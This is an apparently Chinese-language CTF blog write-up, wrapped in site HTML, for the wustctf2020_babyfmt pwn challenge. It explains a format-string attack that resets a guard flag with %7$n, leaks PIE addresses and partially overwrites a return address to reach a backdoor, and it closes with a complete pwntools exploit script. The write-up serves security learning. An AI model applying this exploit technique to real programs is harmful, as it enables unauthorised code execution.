@@ -1,0 +1,568 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="清風微醺" href="https://www.wdqjxtmph.top/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="清風微醺" href="https://www.wdqjxtmph.top/atom.xml" />
+<link rel="alternate" type="application/json" title="清風微醺" href="https://www.wdqjxtmph.top/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="pwn题" />
+
+
+<link rel="canonical" href="https://www.wdqjxtmph.top/2022/04/06/wustctf2020_babyfmt/">
+
+
+
+  <title>
+wustctf2020_babyfmt - CTF |
+Nirvana = 清風微醺 = 凌恒</title>
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">wustctf2020_babyfmt
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2022-04-06 21:44:27">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2022-04-06T21:44:27+08:00">2022-04-06</time>
+  </span>
+  <span class="item" title="本文字数">
+    <span class="icon">
+      <i class="ic i-pen"></i>
+    </span>
+    <span class="text">本文字数</span>
+    <span>1.9k</span>
+    <span class="text">字</span>
+  </span>
+  <span class="item" title="阅读时长">
+    <span class="icon">
+      <i class="ic i-clock"></i>
+    </span>
+    <span class="text">阅读时长</span>
+    <span>2 分钟</span>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">Nirvana</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclga70tsj20zk0m84mr.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicli9lfebj20zk0m84qp.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclfdu6exj20zk0m87hw.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipet8c1a2j20zk0m8kct.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclj61ylzj20zk0m8b29.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclxfdlttj20zk0m8npd.jpg"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/CTF/" itemprop="item" rel="index" title="分类于 CTF"><span itemprop="name">CTF</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
+  <link itemprop="mainEntityOfPage" href="https://www.wdqjxtmph.top/2022/04/06/wustctf2020_babyfmt/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="invincible">
+    <meta itemprop="description" content="凌恒, 凌恒山其若陋兮、">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="清風微醺">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <p>一道简单 fmt 题，但是我搜解题记录时，觉得解得都挺复杂的。</p>
+<p>似乎还没有文章用我的方法，那我就写一种简单的解法。</p>
+<h1 id="绕过fmt判断条件"><a class="markdownIt-Anchor" href="#绕过fmt判断条件">#</a> 绕过 fmt 判断条件</h1>
+<p>我只用到了 fmt_attack 函数。</p>
+<p>由于有一个判定条件：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">fmt_attack</span><span class="params">(<span class="keyword">int</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> format[<span class="number">56</span>]; <span class="comment">// [rsp+10h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(format, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( *a1 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No way!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = <span class="number">1</span>;</span><br><span class="line">  read_n(format, <span class="number">40LL</span>, format);</span><br><span class="line">  <span class="built_in">printf</span>(format);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br></pre></td></tr></table></figure>
+<p>因此我们每次使用该函数时，将 * a1 处的值改为零即可循环利用该函数。</p>
+<p>打断点，运行到代码 * a1 = 1 处</p>
+<p><img data-src="https://tva3.sinaimg.cn/large/008qDYGVgy1h10gisre1oj30l903adio.jpg" alt="1"></p>
+<p>单步跟进，查看 rax 的值 (a1 地址)</p>
+<p><img data-src="https://tva1.sinaimg.cn/large/008qDYGVgy1h10gjag7lsj30q2095jvy.jpg" alt="2"></p>
+<p>运行到 printf 函数，查看 a1 的偏移</p>
+<p><img data-src="https://tva1.sinaimg.cn/large/008qDYGVgy1h10gjt96i6j30lx04nwh3.jpg" alt="3"></p>
+<p>算上 64 位 6 个寄存器传参，偏移量 + 6，则 a1 偏移量为 7。</p>
+<p>则我们每次利用 fmt_attack 函数时，加上 %7$n 即可令 *<strong>a1=0</strong>, 即可重复利用 fmt_attack。</p>
+<h1 id="更改返回地址为后门函数地址"><a class="markdownIt-Anchor" href="#更改返回地址为后门函数地址">#</a> 更改返回地址为后门函数地址</h1>
+<p>运行到 printf 函数时，栈中会有许多函数返回地址。</p>
+<p>其中第一条为 fmt_attack 函数的返回地址，</p>
+<p>第二条是 main 函数的返回地址 (main 函数执行完会执行 libc_start_main 函数)。</p>
+<p>由于本题开了 pie 保护，我们可以用 partial write 篡改第一个返回地址。</p>
+<p><img data-src="https://tvax4.sinaimg.cn/large/008qDYGVgy1h10gk44n3hj30u40iqdxs.jpg" alt="4"></p>
+<p>注意：后门函数直接跳转到 close 函数后即可。</p>
+<p><img data-src="https://tva4.sinaimg.cn/large/008qDYGVgy1h10gkdyk68j30m50ern8b.jpg" alt="5"></p>
+<p>计算 elf 基址：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;%7$n+%17$p&#x27;</span></span><br><span class="line">fmt(payload)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line">ret_value = <span class="built_in">int</span>(r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">elf_base = ret_value-<span class="number">0x102c</span></span><br></pre></td></tr></table></figure>
+<p>下一步直接更改低二字节即可。</p>
+<p>低二字节值:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(elf_base+0xf56)&amp;0xffff</span><br></pre></td></tr></table></figure>
+<h1 id="完整exp"><a class="markdownIt-Anchor" href="#完整exp">#</a> 完整 exp</h1>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&#x27;/mnt/hgfs/ubuntu/BUUCTF/wustctf2020_babyfmt&#x27;</span>)</span><br><span class="line"><span class="comment"># r = remote(&#x27;node4.buuoj.cn&#x27;,29629)</span></span><br><span class="line">secret_addr =<span class="number">0x202060</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt</span>(<span class="params">payload</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fmt(<span class="string">b&#x27;%7$n-%16$p&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;-&#x27;</span>)</span><br><span class="line">ret_addr = <span class="built_in">int</span>(r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)-<span class="number">0x28</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%7$n+%17$p&#x27;</span></span><br><span class="line">fmt(payload)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line">ret_value = <span class="built_in">int</span>(r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">elf_base = ret_value-<span class="number">0x102c</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((elf_base+<span class="number">0xf56</span>)&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c%10$hn&#x27;</span></span><br><span class="line">payload1 = payload1.ljust(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload1+=p64(ret_addr)</span><br><span class="line">fmt(payload1)</span><br><span class="line">log.success(<span class="string">&quot;ret_value: &quot;</span>+<span class="built_in">hex</span>(ret_value))</span><br><span class="line">log.success(<span class="string">&quot;ret_addr: &quot;</span>+<span class="built_in">hex</span>(ret_addr))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+      <div class="tags">
+          <a href="/tags/pwn%E9%A2%98/" rel="tag"><i class="ic i-tag"></i> pwn题</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2022-04-18 21:50:54" itemprop="dateModified" datetime="2022-04-18T21:50:54+08:00">2022-04-18</time>
+  </span>
+  <span id="2022/04/06/wustctf2020_babyfmt/" class="item leancloud_visitors" data-flag-title="wustctf2020_babyfmt" title="阅读次数">
+      <span class="icon">
+        <i class="ic i-eye"></i>
+      </span>
+      <span class="text">阅读次数</span>
+      <span class="leancloud-visitors-count"></span>
+      <span class="text">次</span>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> 赞赏</button>
+  <p>请我喝[茶]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="invincible 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="invincible 支付宝">
+        <p>支付宝</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>invincible <i class="ic i-at"><em>@</em></i>清風微醺
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="https://www.wdqjxtmph.top/2022/04/06/wustctf2020_babyfmt/" title="wustctf2020_babyfmt">https://www.wdqjxtmph.top/2022/04/06/wustctf2020_babyfmt/</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2022/03/13/Tcache%20bin%E6%80%BB%E7%BB%93/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giph4baakhj20zk0m8h5q.jpg" title="Tcachebin 总结">
+  <span class="type">上一篇</span>
+  <span class="category"><i class="ic i-flag"></i> CTF</span>
+  <h3>Tcachebin 总结</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/2022/04/19/%E9%AB%98%E7%89%88%E6%9C%AC%E5%A0%86%E6%8A%80%E5%B7%A7/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipeuibk9fj20zk0m8ay2.jpg" title="未命名">
+  <span class="type">下一篇</span>
+  <span class="category"><i class="ic i-flag"></i> </span>
+  <h3>未命名</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%95%E8%BF%87fmt%E5%88%A4%E6%96%AD%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.</span> <span class="toc-text"> 绕过 fmt 判断条件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9B%B4%E6%94%B9%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E4%B8%BA%E5%90%8E%E9%97%A8%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80"><span class="toc-number">2.</span> <span class="toc-text"> 更改返回地址为后门函数地址</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4exp"><span class="toc-number">3.</span> <span class="toc-text"> 完整 exp</span></a></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="系列文章">
+        <ul>
+          <li><a href="/2021/08/20/string/" rel="bookmark" title="攻防世界string wp 以及个人对格式化字符漏洞偏移量的一些理解">攻防世界string wp 以及个人对格式化字符漏洞偏移量的一些理解</a></li><li><a href="/2021/09/03/babyrop/" rel="bookmark" title="标准32位程序ROP流程和c语言转义字符">标准32位程序ROP流程和c语言转义字符</a></li><li><a href="/2021/09/07/Libcsearcher%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" rel="bookmark" title="LibcSearcher环境配置和ubuntu更新换源问题">LibcSearcher环境配置和ubuntu更新换源问题</a></li><li><a href="/2021/09/09/64%E4%BD%8D%E6%A0%87%E5%87%86ROP%E4%B8%8E%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1/" rel="bookmark" title="标准64位程序ROP流程和堆栈平衡">标准64位程序ROP流程和堆栈平衡</a></li><li><a href="/2021/09/25/%E7%94%B5%E7%A7%91%E6%96%B0%E7%94%9F%E8%B5%9B/" rel="bookmark" title="电科新生赛">电科新生赛</a></li><li><a href="/2021/11/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020-format_string/" rel="bookmark" title="格式化字符串漏洞进阶">格式化字符串漏洞进阶</a></li><li><a href="/2021/11/29/SCU%E6%96%B0%E7%94%9F%E8%B5%9B2021/" rel="bookmark" title="SCU新生赛2021 pwn wp">SCU新生赛2021 pwn wp</a></li><li><a href="/2022/02/02/%E5%88%A9%E7%94%A8realloc%E8%B0%83%E6%95%B4%E6%A0%88%E4%BD%BFone_gadget%E7%94%9F%E6%95%88/" rel="bookmark" title="利用realloc调整栈使one_gadget生效">利用realloc调整栈使one_gadget生效</a></li><li><a href="/2022/03/13/Tcache%20bin%E6%80%BB%E7%BB%93/" rel="bookmark" title="Tcachebin 总结">Tcachebin 总结</a></li><li class="active"><a href="/2022/04/06/wustctf2020_babyfmt/" rel="bookmark" title="wustctf2020_babyfmt">wustctf2020_babyfmt</a></li><li><a href="/2022/07/11/2022%E8%93%9D%E5%B8%BDpwn%20wp/" rel="bookmark" title="2022蓝帽pwn wp">2022蓝帽pwn wp</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="站点概览">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="invincible"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">invincible</p>
+  <div class="description" itemprop="description">凌恒山其若陋兮、</div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">14</span>
+        <span class="name">文章</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">2</span>
+        <span class="name">分类</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">6</span>
+        <span class="name">标签</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
+  </li>
+
+        
+  <li class="item dropdown">
+      <a href="/default/" rel="section"><i class="ic i-feather"></i>文章</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
+  </li>
+
+  </ul>
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/2022/03/13/Tcache%20bin%E6%80%BB%E7%BB%93/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/2022/04/19/%E9%AB%98%E7%89%88%E6%9C%AC%E5%A0%86%E6%8A%80%E5%B7%A7/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>随机文章</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
+</div>
+
+    <span><a href="/2022/03/13/Tcache%20bin%E6%80%BB%E7%BB%93/" title="Tcachebin 总结">Tcachebin 总结</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/04/19/%E9%AB%98%E7%89%88%E6%9C%AC%E5%A0%86%E6%8A%80%E5%B7%A7/" title="未命名">未命名</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
+</div>
+
+    <span><a href="/2021/09/03/babyrop/" title="标准32位程序ROP流程和c语言转义字符">标准32位程序ROP流程和c语言转义字符</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
+</div>
+
+    <span><a href="/2021/09/25/%E7%94%B5%E7%A7%91%E6%96%B0%E7%94%9F%E8%B5%9B/" title="电科新生赛">电科新生赛</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
+</div>
+
+    <span><a href="/2022/07/11/2022%E8%93%9D%E5%B8%BDpwn%20wp/" title="2022蓝帽pwn wp">2022蓝帽pwn wp</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
+</div>
+
+    <span><a href="/2021/11/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020-format_string/" title="格式化字符串漏洞进阶">格式化字符串漏洞进阶</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
+</div>
+
+    <span><a href="/2021/09/07/Libcsearcher%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" title="LibcSearcher环境配置和ubuntu更新换源问题">LibcSearcher环境配置和ubuntu更新换源问题</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="分类于 学习笔记">学习笔记</a>
+</div>
+
+    <span><a href="/2021/10/30/%E5%A0%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-UAF/" title="堆学习-UAF">堆学习-UAF</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
+</div>
+
+    <span><a href="/2021/11/29/SCU%E6%96%B0%E7%94%9F%E8%B5%9B2021/" title="SCU新生赛2021 pwn wp">SCU新生赛2021 pwn wp</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
+</div>
+
+    <span><a href="/2021/09/09/64%E4%BD%8D%E6%A0%87%E5%87%86ROP%E4%B8%8E%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1/" title="标准64位程序ROP流程和堆栈平衡">标准64位程序ROP流程和堆栈平衡</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>最新评论</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2022</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">invincible @ Nirvana</span>
+  </div>
+  <div class="powered-by">
+    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2022/04/06/wustctf2020_babyfmt/',
+    favicon: {
+      show: "（●´3｀●）やれやれだぜ",
+      hide: "(´Д｀)大変だ！"
+    },
+    search : {
+      placeholder: "文章搜索",
+      empty: "关于 「 ${query} 」，什么也没搜到",
+      stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    valine: true,fancybox: true,copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
